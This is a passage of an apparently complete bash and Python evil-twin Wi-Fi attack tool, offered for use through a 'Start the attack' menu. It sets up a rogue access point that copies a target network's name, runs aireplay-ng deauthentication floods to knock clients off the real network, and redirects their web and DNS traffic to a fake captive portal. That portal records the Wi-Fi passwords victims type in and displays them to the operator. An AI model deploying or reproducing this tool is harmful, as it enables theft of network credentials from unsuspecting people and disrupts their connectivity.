            self.send_header("Content-type", "text/html; charset=utf-8")
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.end_headers()
            self.wfile.write(b"Success")
            return
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        self.wfile.write(LOGIN_PAGE.format(essid=ESSID).encode("utf-8"))

    def do_POST(self):
        global AUTHED
        length = int(self.headers.get("Content-length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        params = urllib.parse.parse_qs(body)
        password = params.get("password", [""])[0]
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a") as f:
            f.write(f"[{ts}] Password: {password}\n")

        import subprocess, signal, os
        AUTHED = True
        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", AP_IFACE, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", AP_IFACE, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "443"], capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", AP_IFACE, "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"], capture_output=True)
        try:
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "dns_server.pid")) as f:
                pid = int(f.read().strip())
                os.kill(pid, signal.SIGTERM)
        except: pass

        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.end_headers()
        self.wfile.write(SUCCESS_PAGE.encode("utf-8"))

    def log_message(self, format, *args):
        sys.stderr.write("%s - %s\n" % (self.address_string(), format % args))
        sys.stderr.flush()

def run_server(port, use_ssl=False):
    try:
        server = http.server.HTTPServer(("0.0.0.0", port), Handler)
        if use_ssl:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(CERT_FILE, KEY_FILE)
            server.socket = ctx.wrap_socket(server.socket, server_side=True)
        sys.stderr.write("listening on port %d (%s)\n" % (port, "https" if use_ssl else "http"))
        sys.stderr.flush()
        server.serve_forever()
    except Exception as e:
        sys.stderr.write("FATAL: port %d - %s\n" % (port, e))
        sys.stderr.flush()

t1 = threading.Thread(target=run_server, args=(HTTP_PORT, False), daemon=True)
t1.start()
t2 = threading.Thread(target=run_server, args=(HTTPS_PORT, True), daemon=True)
t2.start()
try:
    while True:
        t1.join(1)
except KeyboardInterrupt:
    pass
PYEOF
    chmod +x "${script_path}"
}

###########################################
# Print a notification when a new client
# connects to the fake AP (gets a DHCP lease).
# Globals:
#   DHCPD_LEASES
# Arguments:
#   None
# Returns:
#   None
###########################################
notify_clients() {
    local known_macs=""
    local mac
    local ip
    local host
    while true; do
        while read -r mac ip host; do
            case " ${known_macs} " in
                *" ${mac} "*)
                    ;;
                *)
                    known_macs="${known_macs} ${mac}"
                    echo ""
                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Client connected: ${BOLD_YELLOW}${mac}${GREEN} got ${BOLD_CYAN}${ip}${host:+${GREEN} (${host})}${WHITE}"
                    echo -ne "${YELLOW}>>${WHITE} "
                    ;;
            esac
        done < <(awk '/^lease /{ip=$2} /hardware ethernet/{mac=$3; gsub(/;/,"",mac)} /client-hostname/{host=$2; gsub(/[;"]+/,"",host)} /^}/{if(mac!="") print mac, ip, host; mac=""; ip=""; host=""}' "${DHCPD_LEASES}" 2>/dev/null)
        sleep 2
    done
}

cleanup() {
    echo ""
    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Cleaning up...${WHITE}"
    pkill -f "hostapd" 2>/dev/null || true
    pkill -f "airbase-ng" 2>/dev/null || true
    pkill -f "aireplay-ng" 2>/dev/null || true
    pkill -f "dhcpd" 2>/dev/null || true
    for iface in $(ip -o link show | grep -o 'at[0-9]*'); do
        ip link set "${iface}" down 2>/dev/null || true
        iw dev "${iface}" del 2>/dev/null || true
    done
    if [ -n "${MON_IFACE:-}" ]; then
        ip link set "${MON_IFACE}" down 2>/dev/null || true
        iw dev "${MON_IFACE}" del 2>/dev/null || true
    fi
    pkill -f "captive_portal.py" 2>/dev/null || true
    pkill -f "dns_server.py" 2>/dev/null || true
    [ -n "${CLIENT_WATCHER_PID:-}" ] && kill "${CLIENT_WATCHER_PID}" 2>/dev/null || true
    local ap_iface="${AP_IFACE:-at0}"
    iptables -t nat -D PREROUTING -i "${ap_iface}" -p tcp --dport 80 -j REDIRECT --to-port 80 2>/dev/null || true
    iptables -t nat -D PREROUTING -i "${ap_iface}" -p tcp --dport 443 -j REDIRECT --to-port 443 2>/dev/null || true
    iptables -t nat -D PREROUTING -i "${ap_iface}" -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || true
    iptables -D INPUT -i "${ap_iface}" -j ACCEPT 2>/dev/null || true
    iptables -D FORWARD -i "${ap_iface}" -o "${lan}" -j ACCEPT 2>/dev/null || true
    iptables -D FORWARD -i "${lan}" -o "${ap_iface}" -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null || true
    iptables -t nat -D POSTROUTING -o "${lan}" -j MASQUERADE 2>/dev/null || true
    if [ -n "${AP_IFACE:-}" ]; then
        ip link set dev "${AP_IFACE}" down 2>/dev/null || true
        ip addr flush dev "${AP_IFACE}" 2>/dev/null || true
        iw dev "${AP_IFACE}" set type managed 2>/dev/null || true
        ip link set dev "${AP_IFACE}" up 2>/dev/null || true
        nmcli device set "${AP_IFACE}" managed yes 2>/dev/null || true
    fi
    rm -f "${DHCPD_CONF}" "${DHCPD_LEASES}" 2>/dev/null || true
    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Done.${WHITE}"
    if [ -s "${TMP_DIR}/passwords.txt" ]; then
        echo ""
        echo -e "${WHITE}[${YELLOW}!${WHITE}]${BOLD_GREEN} Captured passwords:${WHITE}"
        cat "${TMP_DIR}/passwords.txt"
        echo ""
    fi
    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Logs and passwords kept in ${BOLD_CYAN}${TMP_DIR}${WHITE}"
}

main() {
    if [ "$(whoami)" == "root" ]; then
        rm -rf "${TMP_DIR}"
        mkdir -p "${TMP_DIR}"
    fi
    trap cleanup EXIT INT TERM
    local result='main'
    while [ "${result}" == 'main' ];
    do
        result=none

        echo -ne '\033c'
        print_header

        local user_name=`whoami`
        if [ "${user_name}" != "root" ]; then
            echo -e "${YELLOW}     +${WHITE}------------------------------------------------------------------${YELLOW}+"
            echo -e "${WHITE}     | [${RED}!${WHITE}] You need to launch the script as the root user, run it with  ${WHITE}|"
            echo -e "${YELLOW}     +${WHITE}------------------------------------------------------------------${YELLOW}+"
            echo -e "${WHITE}     | ${RED}                    \$${WHITE}=> sudo ${YELLOW}./${GREEN}et${WHITE}-${GREEN}auto${WHITE}.${GREEN}sh${WHITE}                        |"
            echo -e "${WHITE}     | ${RED}                    \$${WHITE}=> sudo ${BLUE}bash ${GREEN}et${WHITE}-${GREEN}auto${WHITE}.${GREEN}sh${WHITE}                     |"
            echo -e "${YELLOW}     +${WHITE}------------------------------------------------------------------${YELLOW}+"
            echo ""
            echo ""
        else
            check_programs

            if [ "${packages_installed}" == true ]; then
                unset packages_installed
                result='main'
                continue
            fi

            echo -e "${YELLOW}     +${WHITE}------------------------------------------------------------------${YELLOW}+"
            echo -e "${WHITE}     | ${YELLOW} ID ${WHITE} |                            ${BOLD_PURPLE}Name${WHITE}                           |"
            echo -e "${YELLOW}     +${WHITE}------------------------------------------------------------------${YELLOW}+"
            echo -e "${WHITE}     | ${RED}[${YELLOW}01${RED}]${WHITE} |${GREEN} Start the attack${WHITE}.                                         |"
            echo -e "${WHITE}     | ${RED}[${YELLOW}02${RED}]${WHITE} |${GREEN} Exit${WHITE}.                                                     |"
            echo -e "${YELLOW}     +${WHITE}------------------------------------------------------------------${YELLOW}+"
            echo ""
            echo -e -n "${WHITE}    ${RED} [${CYAN}!${RED}]${WHITE} Type the${BOLD_RED} ID${WHITE} of your choice: "

            local menu_selection
            read menu_selection
            menu_selection=$((menu_selection + 0))

            case "${menu_selection}" in
                "1")
                    unset attack_abort
                    select_interface
                    if [ -z "${wlan}" ]; then
                        echo ""
                        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} No wireless interface available. Check your adapter.${WHITE}"
                        sleep 2
                        result='main'
                        continue
                    fi
                    select_wifi ${wlan}
                    [ "${attack_abort}" == true ] && result='main' && continue
                    if [ -z "${selected_essid}" ]; then
                        echo ""
                        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} No ESSID selected. Please try again.${WHITE}"
                        sleep 2
                        result='main'
                        continue
                    fi
                    select_internet_interface
                    clear
                    print_header
                    echo ""
                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting fake access point (hostapd)...${WHITE}"

                    nmcli device set "${wlan}" managed no 2>/dev/null || true
                    ip link set dev "${wlan}" down
                    iw dev "${wlan}" set type managed
                    ip link set dev "${wlan}" up

                    cat > "${TMP_DIR}/hostapd.conf" << HCONF
interface=${wlan}
driver=nl80211
ssid=${selected_essid}
hw_mode=g
channel=${selected_channel}
auth_algs=1
ignore_broadcast_ssid=0
ieee80211n=1
wmm_enabled=1
HCONF

                    run_background "hostapd ${TMP_DIR}/hostapd.conf" "hostapd"

                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Waiting for AP mode...${WHITE}"
                    local ap_timeout=15
                    while [ "${ap_timeout}" -gt 0 ]; do
                        if iw dev "${wlan}" info 2>/dev/null | grep -q 'type AP'; then
                            break
                        fi
                        sleep 1
                        ap_timeout=$((ap_timeout - 1))
                    done

                    if ! iw dev "${wlan}" info 2>/dev/null | grep -q 'type AP'; then
                        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} AP failed to start. Check log:${BOLD_YELLOW} ${TMP_DIR}/hostapd.log${WHITE}"
                        if [ -f "${TMP_DIR}/hostapd.log" ]; then
                            echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} hostapd output:${WHITE}"
                            cat "${TMP_DIR}/hostapd.log"
                        fi
                        echo ""
                        echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Use the Atheros AR9271 (ID 3) for the fake AP, not Intel 3165.${WHITE}"
                        sleep 5
                        result='main'
                        continue
                    fi
                    AP_IFACE="${wlan}"

                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Configuring network for victims...${WHITE}"
                    create_dhcpd_config_file

                    ip addr flush dev "${wlan}"
                    ip addr add "${AP_ROUTER}/${AP_PREFIX}" dev "${wlan}"
                    ip link set dev "${wlan}" up

                    iptables -P FORWARD ACCEPT
                    echo "1" > /proc/sys/net/ipv4/ip_forward

                    if [ -n "${lan}" ]; then
                        iptables -A FORWARD -i "${wlan}" -o "${lan}" -j ACCEPT
                        iptables -A FORWARD -i "${lan}" -o "${wlan}" -m state --state ESTABLISHED,RELATED -j ACCEPT
                        iptables -t nat -A POSTROUTING -o "${lan}" -j MASQUERADE
                    else
                        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} No internet interface selected. Victims will have no internet access.${WHITE}"
                    fi

                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting DHCP server...${WHITE}"
                    touch "${DHCPD_LEASES}"
                    run_background "dhcpd -d -cf \"${DHCPD_CONF}\" -lf \"${DHCPD_LEASES}\" ${wlan} 2>&1 | tee -a ${TMP_DIR}/clts.txt" "dhcpd"
                    notify_clients &
                    CLIENT_WATCHER_PID=$!

                    echo ""
                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Attack running! Fake AP: ${BOLD_YELLOW}${selected_essid}${GREEN} on ${BOLD_PURPLE}${wlan}${WHITE}"
                    if [ -n "${lan}" ]; then
                        echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Internet access: ${BOLD_YELLOW}Enabled${WHITE}"
                    else
                        echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Internet access: ${BOLD_RED}Disabled${WHITE}"
                    fi
                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Check: ${BOLD_CYAN}${TMP_DIR}/{hostapd,dhcpd,aireplay-ng}.log${GREEN}, passwords: ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
                    echo ""
                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Commands: ${BOLD_YELLOW}[d]${GREEN}eauth ${WHITE}| ${BOLD_YELLOW}[c]${GREEN}aptive portal ${WHITE}| ${BOLD_YELLOW}[s]${GREEN}tatus ${WHITE}| ${BOLD_YELLOW}[q]${GREEN}uit${WHITE}"
                    deauth_running=false
                    portal_running=false
                    while true; do
                        echo -e -n "${YELLOW}>>${WHITE} "
                        read -n 1 cmd
                        echo ""
                        case "${cmd}" in
                            d|D)
                                if [ "${deauth_running}" == false ]; then
                                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Deauthing clients from ${BOLD_YELLOW}${selected_essid}${WHITE}..."
                                    if [ -z "${MON_IFACE}" ]; then
                                        MON_IFACE="mon0"
                                        local mon_n=0
                                        while ip -o link show "${MON_IFACE}" &>/dev/null; do
                                            mon_n=$((mon_n + 1))
                                            MON_IFACE="mon${mon_n}"
                                        done
                                        iw dev "${wlan}" interface add "${MON_IFACE}" type monitor
                                        ip link set "${MON_IFACE}" up
                                    fi
                                    iw dev "${MON_IFACE}" set channel ${selected_channel} 2>/dev/null || iwconfig "${MON_IFACE}" channel ${selected_channel} 2>/dev/null
                                    run_background "aireplay-ng -0 0 -a ${selected_bssid} ${MON_IFACE} --ignore-negative-one" "aireplay-ng"
                                    deauth_running=true
                                else
                                    echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Deauth already running.${WHITE}"
                                fi
                                ;;
                            c|C)
                                if [ "${portal_running}" == false ]; then
                                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting captive portal...${WHITE}"
                                    create_captive_portal "${selected_essid}"

                                    iptables -t nat -A PREROUTING -i "${wlan}" -p tcp --dport 80 -j REDIRECT --to-port 80
                                    iptables -t nat -A PREROUTING -i "${wlan}" -p tcp --dport 443 -j REDIRECT --to-port 443
                                    iptables -t nat -A PREROUTING -i "${wlan}" -p udp --dport 53 -j REDIRECT --to-port 53
                                    iptables -I INPUT 1 -i "${wlan}" -j ACCEPT

                                    run_background "python3 ${TMP_DIR}/dns_server.py ${AP_ROUTER} ${TMP_DIR}/dns_server.log" "dns_server"
                                    run_background "python3 ${TMP_DIR}/captive_portal.py '${selected_essid}' ${TMP_DIR}/passwords.txt 80 ${wlan}" "captive_portal"

                                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Captive portal running. Passwords logged to ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
                                    portal_running=true
                                else
                                    echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Captive portal already running.${WHITE}"
                                fi
                                ;;
                            s|S)
                                echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} iptables NAT (PREROUTING):${WHITE}"
                                iptables -t nat -L PREROUTING -n -v 2>/dev/null
                                echo ""
                                echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} iptables INPUT:${WHITE}"
                                iptables -L INPUT -n -v 2>/dev/null
                                echo ""
                                echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} iptables FORWARD:${WHITE}"
                                iptables -L FORWARD -n -v 2>/dev/null
                                echo ""
                                echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} DHCP clients:${WHITE}"
                                awk '/^lease /{ip=$2} /hardware ethernet/{mac=$3; gsub(/;/,"",mac)} /client-hostname/{host=$2; gsub(/[;"]+/,"",host)} /^}/{if(mac!="") print "  " mac "  " ip "  " host; mac=""; ip=""; host=""}' "${DHCPD_LEASES}" 2>/dev/null
                                echo ""
                                if [ "${portal_running}" == true ]; then
                                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Captive portal: ${BOLD_YELLOW}running${WHITE}"
                                else
                                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Captive portal: stopped${WHITE}"
                                fi
                                if [ "${deauth_running}" == true ]; then
                                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Deauth: ${BOLD_YELLOW}running${WHITE}"
                                else
                                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Deauth: stopped${WHITE}"
                                fi
                                echo ""
                                ;;
                            q|Q)
                                break
                                ;;
                        esac
                    done
                    ;;
                "2")
                    echo ""
                    echo -e "${WHITE}     [${GREEN} ok ${WHITE}]${WHITE} See ${BOLD_YELLOW}you${WHITE} next time!"
                    echo ""
                    exit
                    ;;
                *)
                    echo ""
                    echo -e "${WHITE}     [${RED}!${WHITE}]${BOLD_RED} Input${WHITE} is out of range."
                    echo ""
                    sleep 2.0
                    result='main'
                    ;;
            esac
        fi
    done
}
main "$@"
